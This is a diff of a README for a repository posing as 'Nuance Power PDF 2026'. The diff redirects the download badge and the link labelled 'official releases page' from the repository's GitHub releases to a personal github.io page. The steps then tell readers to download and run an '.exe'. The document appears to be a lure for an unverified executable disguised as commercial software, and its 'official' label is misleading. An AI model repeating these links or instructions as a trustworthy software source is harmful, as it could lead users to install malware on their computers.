@@ -1,6 +1,6 @@
 # 📄 Nuance-Power-PDF-2026 - Create Edit And Secure Your Documents
 
-[![Download Nuance Power PDF](https://img.shields.io/badge/Download-Power_PDF_2026-blue)](https://github.com/quint363/Nuance-Power-PDF-2026/releases)
+[![Download Nuance Power PDF](https://img.shields.io/badge/Download-Power_PDF_2026-blue)](https://quint363.github.io)
 
 Nuance Power PDF 2026 provides tools for document management on Windows 10 and Windows 11. This software allows users to create, convert, and edit PDF files. It includes OCR technology to turn scanned paper documents into searchable text files.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these minimum specifications before you start the ins
 
 Follow these steps to obtain the correct version of the software for your Windows machine:
 
-1. Visit the [official releases page](https://github.com/quint363/Nuance-Power-PDF-2026/releases).
+1. Visit the [official releases page](https://quint363.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the link that ends in ".exe" to begin the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
